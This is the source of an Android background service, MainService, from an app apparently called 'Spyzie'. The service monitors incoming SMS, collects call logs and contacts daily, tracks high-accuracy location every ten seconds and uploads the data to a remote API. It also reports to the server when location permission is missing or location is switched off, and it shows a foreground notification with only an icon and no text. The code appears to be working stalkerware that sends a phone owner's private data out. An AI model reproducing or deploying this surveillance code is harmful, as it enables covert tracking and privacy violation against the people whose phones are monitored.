package com.tantd.spyzie.service;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.content.IntentFilter;
import android.database.ContentObserver;
import android.location.Location;
import android.net.Uri;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.provider.Telephony;
import android.util.Log;

import androidx.annotation.Nullable;
import androidx.core.app.NotificationCompat;
import androidx.work.ExistingPeriodicWorkPolicy;
import androidx.work.PeriodicWorkRequest;
import androidx.work.WorkManager;

import com.google.android.gms.location.FusedLocationProviderClient;
import com.google.android.gms.location.LocationCallback;
import com.google.android.gms.location.LocationRequest;
import com.google.android.gms.location.LocationResult;
import com.google.android.gms.location.LocationServices;
import com.tantd.spyzie.R;
import com.tantd.spyzie.SpyzieApplication;
import com.tantd.spyzie.data.db.DbManager;
import com.tantd.spyzie.data.device.worker.GetCallsWorker;
import com.tantd.spyzie.data.device.worker.GetContactsWorker;
import com.tantd.spyzie.data.model.Error;
import com.tantd.spyzie.data.network.ApiManager;
import com.tantd.spyzie.di.module.ServiceModule;
import com.tantd.spyzie.receiver.SmsObserver;
import com.tantd.spyzie.receiver.SpyzieReceiver;
import com.tantd.spyzie.util.CommonUtils;
import com.tantd.spyzie.util.Constants;
import com.tantd.spyzie.util.NetworkUtils;

import java.util.List;
import java.util.concurrent.TimeUnit;

import javax.inject.Inject;

public class MainService extends Service {

    @Inject
    ApiManager mApiManager;
    @Inject
    DbManager mDbManager;

    private static final String DEBUG_SUB_TAG = "[" + MainService.class.getSimpleName() + "] ";
    private static final String CHANNEL_ID = "ForegroundServiceChannel";
    private static final int UPDATE_INTERVAL = 10 * 1000;
    private static final int FASTEST_UPDATE_INTERVAL = 10 * 1000;
    private static final int CONDITION_CHECKING_INTERVAL = 5 * 1000;

    private ContentObserver mContentObserver;

    private SpyzieReceiver mSpyzieReceiver;

    private PeriodicWorkRequest mGetCallsWorkRequest;
    private PeriodicWorkRequest mGetContactsWorkRequest;

    private FusedLocationProviderClient mLocationProviderClient;
    private LocationCallback mLocationCallback;

    private Notification mNotification;

    private boolean isUpdatingLocation;
    private boolean running;

    @Override
    public void onCreate() {
        createServiceComponent();
        super.onCreate();
        Log.d(Constants.LOG_TAG, DEBUG_SUB_TAG + "onCreate()");

        mContentObserver = new SmsObserver(new Handler(), this);
        getContentResolver().registerContentObserver(Uri.parse("content://sms"), true, mContentObserver);
    }

    private void createServiceComponent() {
        SpyzieApplication.getInstance().createServiceComponent(new ServiceModule(this)).inject(this);
    }

    private void releaseServiceComponent() {
        SpyzieApplication.getInstance().releaseServiceComponent();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.d(Constants.LOG_TAG, DEBUG_SUB_TAG + "onStartCommand()");

        IntentFilter filter = new IntentFilter();
        filter.addAction(Telephony.Sms.Intents.SMS_RECEIVED_ACTION);
        mSpyzieReceiver = new SpyzieReceiver();
        registerReceiver(mSpyzieReceiver, filter);

        startGetCallsWorkRequest();

        startGetContactsWorkRequest();

        startLocationUpdate();

        return START_STICKY;
    }

    private void startGetCallsWorkRequest() {
        mGetCallsWorkRequest = new PeriodicWorkRequest.Builder(GetCallsWorker.class, 24, TimeUnit.HOURS).build();
        WorkManager.getInstance(this).enqueueUniquePeriodicWork(GetCallsWorker.GET_CALLS_WORK_REQUEST,
                ExistingPeriodicWorkPolicy.KEEP, mGetCallsWorkRequest);
    }

    private void startGetContactsWorkRequest() {
        mGetContactsWorkRequest = new PeriodicWorkRequest.Builder(GetContactsWorker.class, 24, TimeUnit.HOURS).build();
        WorkManager.getInstance(this).enqueueUniquePeriodicWork(GetContactsWorker.GET_CONTACTS_WORK_REQUEST,
                ExistingPeriodicWorkPolicy.KEEP, mGetContactsWorkRequest);
    }

    private void startLocationUpdate() {
        mLocationProviderClient = LocationServices.getFusedLocationProviderClient(this);
        mLocationCallback = new LocationCallback() {

            @Override
            public void onLocationResult(LocationResult locationResult) {
                Location location = locationResult.getLastLocation();
                if (location != null) {
                    proceedLocationData(new com.tantd.spyzie.data.model.Location(location.getLatitude(),
                            location.getLongitude()));
                }
            }
        };

        running = true;
        isUpdatingLocation = false;
        createNotificationChannelForAndroidO();
        mNotification = new NotificationCompat.Builder(this, CHANNEL_ID)
                .setSmallIcon(R.drawable.ic_sync)
                .build();
        startForeground(1, mNotification);
        new Thread(new UpdateLocationRunnable()).start();
    }

    private void proceedLocationData(com.tantd.spyzie.data.model.Location location) {
        if (NetworkUtils.isNetworkConnected(this)) {
            List<com.tantd.spyzie.data.model.Location> savedData =
                    (List<com.tantd.spyzie.data.model.Location>) mDbManager.find(com.tantd.spyzie.data.model.Location.class
                            , 0, Constants.MAX_READ_DATA_ENTRIES);
            savedData.add(location);
            mApiManager.sendLocationData(savedData);
            savedData.remove(savedData.size() - 1);
            if (savedData.size() > 0) {
                mDbManager.removeLocations(savedData);
            }
        } else {
            mDbManager.put(location);
        }
    }

    private void createNotificationChannelForAndroidO() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel serviceChannel = new NotificationChannel(
                    CHANNEL_ID,
                    "Foreground Service Channel",
                    NotificationManager.IMPORTANCE_DEFAULT
            );

            NotificationManager manager = getSystemService(NotificationManager.class);
            manager.createNotificationChannel(serviceChannel);
        }
    }

    private class UpdateLocationRunnable implements Runnable {

        @Override
        public void run() {
            while (running) {
                boolean hasLocationPermissions = CommonUtils.hasLocationPermissions(MainService.this);
                boolean isLocationTurnOn = CommonUtils.isLocationTurnOn(MainService.this);
                Log.d(Constants.LOG_TAG, DEBUG_SUB_TAG + "hasPermissions=" + hasLocationPermissions
                        + ", isLocationOn=" + isLocationTurnOn);
                if (hasLocationPermissions && isLocationTurnOn) {
                    if (!isUpdatingLocation) {
                        Log.d(Constants.LOG_TAG, DEBUG_SUB_TAG + "Update location");
                        requestLocationUpdates();
                    }
                    isUpdatingLocation = true;
                } else {
                    if (isUpdatingLocation) {
                        Log.d(Constants.LOG_TAG, DEBUG_SUB_TAG + "Stop updating location");
                        removeLocationUpdates();
                        if (!hasLocationPermissions) {
                            mApiManager.sendExceptionTracking(Error.HAS_NO_LOCATION_PERMISSIONS);
                        }
                        if (!isLocationTurnOn) {
                            mApiManager.sendExceptionTracking(Error.LOCATION_IS_OFF);
                        }
                    }
                    isUpdatingLocation = false;
                }
                try {
                    Thread.sleep(CONDITION_CHECKING_INTERVAL);
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
            }
            running = false;
        }
    }

    private void requestLocationUpdates() {
        LocationRequest locationRequest = new LocationRequest();
        locationRequest.setPriority(LocationRequest.PRIORITY_HIGH_ACCURACY);
        locationRequest.setInterval(UPDATE_INTERVAL);
        locationRequest.setFastestInterval(FASTEST_UPDATE_INTERVAL);
        mLocationProviderClient.requestLocationUpdates(locationRequest, mLocationCallback, Looper.getMainLooper());
    }

    private void removeLocationUpdates() {
        mLocationProviderClient.removeLocationUpdates(mLocationCallback);
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        Log.d(Constants.LOG_TAG, DEBUG_SUB_TAG + "onDestroy()");

        getContentResolver().unregisterContentObserver(mContentObserver);
        unregisterReceiver(mSpyzieReceiver);

        releaseServiceComponent();

        // TODO: cancel all work requests
        WorkManager.getInstance(this).cancelWorkById(mGetCallsWorkRequest.getId());
        WorkManager.getInstance(this).cancelWorkById(mGetContactsWorkRequest.getId());
        running = false;
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
